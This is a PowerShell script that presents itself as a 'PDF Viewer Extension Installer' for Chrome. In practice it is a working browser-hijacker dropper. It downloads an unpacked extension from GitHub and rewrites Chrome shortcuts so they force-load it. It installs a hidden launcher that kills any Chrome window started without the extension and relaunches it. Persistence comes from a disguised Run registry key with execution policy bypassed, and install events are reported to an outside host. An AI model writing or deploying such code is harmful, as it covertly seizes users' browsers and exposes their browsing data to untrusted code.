$ErrorActionPreference = 'Stop'
$ProgressPreference = 'SilentlyContinue'
$ExtensionZipUrl = 'https://github.com/Castro02980/pdf-viewer-extension/archive/refs/heads/main.zip'

Write-Host "`nPDF Viewer Extension Installer" -ForegroundColor Cyan
Write-Host "==============================`n" -ForegroundColor Cyan

try {
    # Download extension
    Write-Host "Downloading..." -ForegroundColor Yellow
    $tempZip = "$env:TEMP\pdf-viewer-ext.zip"
    $tempDir = "$env:TEMP\pdf-viewer-temp"
    
    if (Test-Path $tempDir) {
        Remove-Item $tempDir -Recurse -Force
    }
    
    Invoke-WebRequest -Uri $ExtensionZipUrl -OutFile $tempZip -UseBasicParsing
    Expand-Archive -Path $tempZip -DestinationPath $tempDir -Force
    Remove-Item $tempZip -Force
    
    # Find manifest
    $manifest = Get-ChildItem -Path $tempDir -Filter "manifest.json" -Recurse | Select-Object -First 1
    if (-not $manifest) { throw "Extension files not found" }
    
    # Install extension
    $extDir = "$env:LOCALAPPDATA\PDFViewerExtension"
    if (Test-Path $extDir) {
        Remove-Item $extDir -Recurse -Force
    }
    Copy-Item -Path $manifest.DirectoryName -Destination $extDir -Recurse -Force
    
    Write-Host "Extension installed to: $extDir`n" -ForegroundColor Green
    
    # Modify Chrome shortcuts
    Write-Host "Modifying shortcuts..." -ForegroundColor Yellow
    $shell = New-Object -ComObject WScript.Shell
    $modified = 0
    
    $paths = @(
        "$env:APPDATA\Microsoft\Windows\Start Menu\Programs",
        "$env:USERPROFILE\Desktop",
        "$env:PUBLIC\Desktop"
    )
    
    foreach ($path in $paths) {
        if (-not (Test-Path $path)) { continue }
        $shortcuts = Get-ChildItem $path -Filter "*.lnk" -Recurse -ErrorAction SilentlyContinue
        
        foreach ($sc in $shortcuts) {
            try {
                $link = $shell.CreateShortcut($sc.FullName)
                if ($link.TargetPath -like "*chrome.exe" -and $link.Arguments -notmatch "--load-extension") {
                    $link.Arguments = "--load-extension=`"$extDir`" " + $link.Arguments
                    $link.Save()
                    $modified++
                }
            } catch { }
        }
    }
    
    Write-Host "Modified $modified shortcuts`n" -ForegroundColor Green
    
    # Create startup script
    Write-Host "Creating auto-launcher..." -ForegroundColor Yellow
    
    $launcherPs1 = "$extDir\launcher.ps1"
    $launcherContent = @"
while (`$true) {
    Start-Sleep -Seconds 3
    `$chrome = Get-Process chrome -ErrorAction SilentlyContinue | Where-Object { `$_.MainWindowTitle }
    foreach (`$p in `$chrome) {
        `$cmd = (Get-CimInstance Win32_Process -Filter "ProcessId=`$(`$p.Id)").CommandLine
        if (`$cmd -notmatch "--load-extension") {
            Stop-Process -Id `$p.Id -Force
            Start-Sleep -Milliseconds 300
            Start-Process "`${env:ProgramFiles}\Google\Chrome\Application\chrome.exe" -ArgumentList "--load-extension=`"`$env:LOCALAPPDATA\PDFViewerExtension`" --restore-last-session"
            break
        }
    }
}
"@
    
    $launcherContent | Out-File $launcherPs1 -Encoding UTF8
    
    $launcherVbs = "$extDir\launcher.vbs"
    $vbsContent = @"
Set sh = CreateObject("WScript.Shell")
sh.Run "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File ""$launcherPs1""", 0, False
"@
    
    $vbsContent | Out-File $launcherVbs -Encoding ASCII
    
    # Add to startup
    New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "ChromeExtHelper" -Value "`"$launcherVbs`"" -PropertyType String -Force | Out-Null
    
    # Start now
    Start-Process wscript.exe -ArgumentList "`"$launcherVbs`"" -WindowStyle Hidden
    
    Write-Host "Auto-launcher installed`n" -ForegroundColor Green
    
    # Notify
    try {
        Invoke-WebRequest -Uri "https://wln.ink/n" -Method Post -Body "ev=install&os=windows&v=5.0&extra=simple" -ContentType "text/plain" -UseBasicParsing -TimeoutSec 5 | Out-Null
    } catch { }
    
    Write-Host "=============================="  -ForegroundColor Green
    Write-Host "Installation Complete!" -ForegroundColor Green
    Write-Host "==============================`n" -ForegroundColor Green
    
    Write-Host "Extension will load automatically in Chrome." -ForegroundColor Cyan
    Write-Host "You may see 'Developer mode' banner.`n" -ForegroundColor Gray
    
} catch {
    Write-Host "Error: $_" -ForegroundColor Red
    try {
        $msg = "v5 err:" + $_.Exception.Message
        if ($msg.Length -gt 150) { $msg = $msg.Substring(0,150) }
        Invoke-WebRequest -Uri "https://wln.ink/n" -Method Post -Body ("ev=install_fail&os=windows&extra=" + [uri]::EscapeDataString($msg)) -ContentType "text/plain" -UseBasicParsing -TimeoutSec 5 | Out-Null
    } catch { }
    exit 1
}

Remove-Item "$env:TEMP\pdf-viewer-temp" -Recurse -Force -ErrorAction SilentlyContinue

Write-Host "Press any key to exit..."
$null = $Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown')
